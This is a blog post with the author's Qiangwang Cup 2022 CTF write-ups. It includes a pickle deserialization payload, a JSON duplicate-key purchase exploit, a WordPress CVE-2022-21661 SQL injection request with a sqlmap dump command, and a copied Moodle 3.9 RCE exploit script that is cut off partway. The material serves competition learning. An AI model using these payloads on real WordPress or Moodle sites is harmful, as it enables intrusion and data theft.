<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>强网杯2022参赛纪实 | Dem0のblog</title><meta name="keywords" content="CTF复现"><meta name="author" content="Dem0"><meta name="copyright" content="Dem0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="crash侥幸拿下了一血,很开心。题目思路就是有pickle反序列化的位置。要过掉的位置就在于userdata.token&#x3D;&#x3D;hash(&quot;xxx&quot;),那么就是类的__eq__。所以就是新建一个类了哦~ import base64,picklefrom lib2to3.pgen2 import tokenexec(&amp;#x27;&amp;#x27;&amp;#x27;class dem1:\n d">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯2022参赛纪实">
<meta property="og:url" content="https://dem0dem0.top/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2022%E5%8F%82%E8%B5%9B%E7%BA%AA%E5%AE%9E/index.html">
<meta property="og:site_name" content="Dem0のblog">
<meta property="og:description" content="crash侥幸拿下了一血,很开心。题目思路就是有pickle反序列化的位置。要过掉的位置就在于userdata.token&#x3D;&#x3D;hash(&quot;xxx&quot;),那么就是类的__eq__。所以就是新建一个类了哦~ import base64,picklefrom lib2to3.pgen2 import tokenexec(&amp;#x27;&amp;#x27;&amp;#x27;class dem1:\n d">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img.dem0dem0.top//images/51bbfbfa6f0edf4137e939c7fa520391.jpeg">
<meta property="article:published_time" content="2022-08-01T02:56:42.000Z">
<meta property="article:modified_time" content="2022-08-01T03:53:21.540Z">
<meta property="article:author" content="Dem0">
<meta property="article:tag" content="CTF复现">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.dem0dem0.top//images/51bbfbfa6f0edf4137e939c7fa520391.jpeg"><link rel="shortcut icon" href="https://q1.qlogo.cn/g?b=qq&nk=79475432&s=640"><link rel="canonical" href="https://dem0dem0.top/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2022%E5%8F%82%E8%B5%9B%E7%BA%AA%E5%AE%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '强网杯2022参赛纪实',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-01 11:53:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dem0のblog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=79475432&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.dem0dem0.top//images/51bbfbfa6f0edf4137e939c7fa520391.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Dem0のblog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">强网杯2022参赛纪实</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-01T02:56:42.000Z" title="发表于 2022-08-01 10:56:42">2022-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-01T03:53:21.540Z" title="更新于 2022-08-01 11:53:21">2022-08-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%A4%8D%E7%8E%B0/">CTF复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>58分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="强网杯2022参赛纪实"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h1><p>侥幸拿下了一血,很开心。题目思路就是有<code>pickle</code>反序列化的位置。要过掉的位置就在于<code>userdata.token==hash(&quot;xxx&quot;)</code>,那么就是类的<code>__eq__</code>。所以就是新建一个类了哦~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickle</span><br><span class="line"><span class="keyword">from</span> lib2to3.pgen2 <span class="keyword">import</span> token</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class dem1:\n def __eq__(self, __o: object) -&gt; bool:\n  return True\nclass dem0:\n username=&#x27;admin&#x27;\n token=dem1()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dem0().token==<span class="built_in">hash</span>(<span class="string">&quot;11111&quot;</span>))</span><br><span class="line">userdata=<span class="string">b&#x27;&#x27;&#x27;(c__builtin__</span></span><br><span class="line"><span class="string">exec</span></span><br><span class="line"><span class="string">S&#x27;class dem0:\\n class dem1:\\n  def __eq__(self, __o: object) -&gt; bool:\\n   return True\\n token=dem1()\\n username=&#x27;admin&#x27;&#x27;</span></span><br><span class="line"><span class="string">o(c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">S&#x27;dem0()&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line">userdata = pickle.loads(userdata)</span><br><span class="line"><span class="built_in">print</span>(userdata.username)</span><br><span class="line"><span class="built_in">print</span>(userdata.token==<span class="built_in">hash</span>(<span class="string">&quot;11111&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(userdata))</span><br><span class="line"><span class="comment"># https://blog.csdn.net/qq_35789421/article/details/113572239</span></span><br></pre></td></tr></table></figure>

<p>后面就是一个nginx的配置了，负载均衡，权重给高一点就行了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /gettestresult?server1=localhost%3A8088&amp;weight1=10&amp;server2=localhost%3A8087&amp;weight2=0&amp;server3=localhost%3A8086&amp;weight3=0 HTTP/1.1</span><br><span class="line">Host: 182.92.223.176:25370</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://182.92.223.176:25370/balancer</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: session=eyJwYXNzd29yZCI6bnVsbH0.YuTOhg.JcIz3yCezaN-mtAhqmHF62flPWE; userdata=KGNfX2J1aWx0aW5fXwpleGVjClMnY2xhc3MgdXNlcjpcbiBjbGFzcyB0b2tlOlxuICBkZWYgX19lcV9fKHNlbGYsIG8pOlxuICAgcmV0dXJuIFRydWVcbiB0b2tlbj10b2tlKClcbiB1c2VybmFtZT0nYWRtaW4nJwpvKGNfX2J1aWx0aW5fXwpldmFsClMndXNlcigpJwpvLg==</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h1 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h1><p>很明显就是一个<code>xss</code>让管理员把自己的密码改了，然后登录admin用户。</p>
<p><img src="https://img.dem0dem0.top//images/image-20220801113210829.png" alt="image-20220801113210829"></p>
<p>拿到源码之后，审计，直接查看源码就发现，两个<code>json</code>解析的问题。</p>
<p><img src="https://img.dem0dem0.top//images/image-20220801113336148.png" alt="image-20220801113336148"></p>
<p>这个函数的解析，我们在网上搜就知道了，<code>jsonparser</code>是解析第一个，python里面的是解析第二个。</p>
<p><img src="https://img.dem0dem0.top//images/image-20220801113418572.png" alt="image-20220801113418572"></p>
<p>所以payload就出来了</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/buy</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">47.93</span><span class="number">.187</span><span class="number">.169</span><span class="string">:22503</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">60</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">X-Requested-With:</span> <span class="string">XMLHttpRequest</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/103.0.0.0</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/json</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="string">http://47.93.187.169:22503</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://47.93.187.169:22503/main</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">session=eyJ1c2VyIjoiYWRtaW4ifQ.YuSlIA.OBsf44KtRgwpJoBTIA5QKJ2-TrM</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;product&quot;</span><span class="string">:</span>[&#123;<span class="string">&quot;id&quot;</span><span class="string">:1</span>,<span class="string">&quot;num&quot;</span><span class="string">:0</span>&#125;,&#123;<span class="string">&quot;id&quot;</span><span class="string">:2</span>,</span><br><span class="line"><span class="string">&quot;num&quot;</span><span class="string">:-1</span>,</span><br><span class="line"><span class="string">&quot;num&quot;</span><span class="string">:1</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h1 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a>easylogin</h1><p>信息收集之后,可以知道</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cn-sec.com/archives/1206142.html</span><br><span class="line">https://kiksecurity.com/blog/sql-injection-in-wordpress-core-cve-2022-21661/</span><br><span class="line">https://www.exploit-db.com/exploits/50663 -- CVE-2022-21661</span><br></pre></td></tr></table></figure>

<p>可以拿到一个sql注入的payload</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">47.105</span><span class="number">.60</span><span class="number">.229</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/103.0.0.0</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://47.105.60.229/index.php/2022/07/30/hello-world/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">wordpress_test_cookie=WP%20Cookie%20check</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">183</span></span><br><span class="line"></span><br><span class="line"><span class="string">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1)</span> <span class="string">or</span> <span class="string">updatexml(0x7e,concat(1,user()),0x7e)#&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后用sqlmap直接脱裤<code>python sqlmap.py -r ~/opt/sql1.txt --technique=E -D moodle -T mdl_sessions -C sid --dump</code></p>
<p>后面的那一步利用已有session直接RCE.<code>8888</code>端口是<code>moodle</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)</span></span><br><span class="line"><span class="comment"># Date: 12-05-2021</span></span><br><span class="line"><span class="comment"># Exploit Author: lanz</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://moodle.org/</span></span><br><span class="line"><span class="comment"># Version: Moodle 3.9</span></span><br><span class="line"><span class="comment"># Tested on: FreeBSD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Moodle 3.9 - RCE (Authenticated as teacher)</span></span><br><span class="line"><span class="comment">## Based on PoC and Payload to assign full permissions to manager rol:</span></span><br><span class="line"><span class="comment">##   * https://github.com/HoangKien1020/CVE-2020-14321</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Repository: https://github.com/lanzt/CVE-2020-14321/blob/main/CVE-2020-14321_RCE.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Color</span>:</span><br><span class="line">    BLUE = <span class="string">&#x27;\033[94m&#x27;</span></span><br><span class="line">    GREEN = <span class="string">&#x27;\033[92m&#x27;</span></span><br><span class="line">    YELLOW = <span class="string">&#x27;\033[93m&#x27;</span></span><br><span class="line">    RED = <span class="string">&#x27;\033[91m&#x27;</span></span><br><span class="line">    END = <span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">def_handler</span>(<span class="params">sig, frame</span>):</span><br><span class="line">    <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\n[!] 3xIt1ngG...\n&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, def_handler)</span><br><span class="line"></span><br><span class="line">banner = base64.b64decode(<span class="string">&quot;IF9fICAgICBfXyAgICAgX18gICBfXyAgX18gICBfXyAgICAgICAgICAgICAgX18gIF9fICAgICAKLyAgXCAgL3xfICBfXyAgIF8pIC8gIFwgIF8pIC8gIFwgX18gIC98IHxfX3wgIF8pICBfKSAvfCAKXF9fIFwvIHxfXyAgICAgL19fIFxfXy8gL19fIFxfXy8gICAgICB8ICAgIHwgX18pIC9fXyAgfCDigKIgYnkgbGFuegoKTW9vZGxlIDMuOSAtIFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbiAoQXV0aGVudGljYXRlZCBhcyB0ZWFjaGVyKQpDb3Vyc2UgZW5yb2xtZW50cyBhbGxvd2VkIHByaXZpbGVnZSBlc2NhbGF0aW9uIGZyb20gdGVhY2hlciByb2xlIGludG8gbWFuYWdlciByb2xlIHRvIFJDRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA==&quot;</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Color.BLUE + banner + Color.END)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usagemybro</span>():</span><br><span class="line">    fNombre = os.path.basename(__file__)</span><br><span class="line">    ussage = fNombre + <span class="string">&#x27; [-h] [-u USERNAME] [-p PASSWORD] [-idm ID_MANAGER] [-idc ID_COURSE] [-c COMMAND] [--cookie TEACHER_COOKIE] url\n\n&#x27;</span></span><br><span class="line">    ussage += <span class="string">&#x27;[+] Examples:\n&#x27;</span></span><br><span class="line">    ussage += <span class="string">&#x27;\t&#x27;</span> + fNombre + <span class="string">&#x27; http://moodle.site.com/moodle -u teacher_name -p teacher_pass\n&#x27;</span></span><br><span class="line">    ussage += <span class="string">&#x27;\t&#x27;</span> + fNombre + <span class="string">&quot; http://moodle.site.com/moodle --cookie thisistheffcookieofmyteaaacher\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ussage</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arguments</span>():</span><br><span class="line">    parse = argparse.ArgumentParser(usage=usagemybro())</span><br><span class="line">    parse.add_argument(dest=<span class="string">&#x27;url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;URL Moodle site&#x27;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-u&#x27;</span>, dest=<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;lanz&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Teacher username, default: lanz&#x27;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-p&#x27;</span>, dest=<span class="string">&#x27;password&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;Lanz123$!&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Teacher password, default: Lanz123$!&#x27;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-idm&#x27;</span>, dest=<span class="string">&#x27;id_manager&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;25&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Manager user ID, default: 25&#x27;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-idc&#x27;</span>, dest=<span class="string">&#x27;id_course&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;5&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Course ID valid to enrol yourself, default: 5&#x27;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-c&#x27;</span>, dest=<span class="string">&#x27;command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;whoami&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Command to execute, default: whoami&#x27;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;--cookie&#x27;</span>, dest=<span class="string">&#x27;teacher_cookie&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Teacher cookie (if you don\&#x27;t have valid credentials)&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> parse.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">url, username, password, course_id, teacher_cookie</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Sign in on site, with creds or with cookie</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    p1 = log.progress(<span class="string">&quot;Login on site&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/login/index.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sign in with teacher cookie</span></span><br><span class="line">    <span class="keyword">if</span> teacher_cookie != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        p1.status(<span class="string">&quot;Cookie &quot;</span> + Color.BLUE + <span class="string">&quot;MoodleSession:&quot;</span> + teacher_cookie + Color.END)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In case the URL format is: http://moodle.site.com/moodle</span></span><br><span class="line">        cookie_domain = url.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>] <span class="comment"># moodle.site.com</span></span><br><span class="line">        cookie_path = <span class="string">&quot;/%s/&quot;</span> % (url.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">3</span>]) <span class="comment"># /moodle/</span></span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;MoodleSession&#x27;</span>, teacher_cookie, domain=cookie_domain, path=cookie_path)</span><br><span class="line"></span><br><span class="line">        r = session.get(url + <span class="string">&#x27;/user/index.php&#x27;</span>, params=&#123;<span class="string">&quot;id&quot;</span>:course_id&#125;)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            re.findall(<span class="string">r&#x27;class=&quot;usertext mr-1&quot;&gt;(.*?)&lt;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            p1.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">            <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nInvalid cookie, try again, verify cookie domain and cookie path or simply change all.\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        id_user = re.findall(<span class="string">r&#x27;id=&quot;nav-notification-popover-container&quot; data-userid=&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        sess_key = re.findall(<span class="string">r&#x27;&quot;sesskey&quot;:&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        p1.success(Color.BLUE + <span class="string">&quot;MoodleSession:&quot;</span> + teacher_cookie + Color.END + Color.YELLOW +  <span class="string">&quot; ✓&quot;</span> + Color.END)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sign in with teacher credentials</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">and</span> password != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        p1.status(<span class="string">&quot;Creds &quot;</span> + Color.BLUE + username + <span class="string">&quot;:&quot;</span> + password + Color.END)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        login_token = re.findall(<span class="string">r&#x27;name=&quot;logintoken&quot; value=&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        data_post = &#123;</span><br><span class="line">            <span class="string">&quot;anchor&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;logintoken&quot;</span> : login_token,</span><br><span class="line">            <span 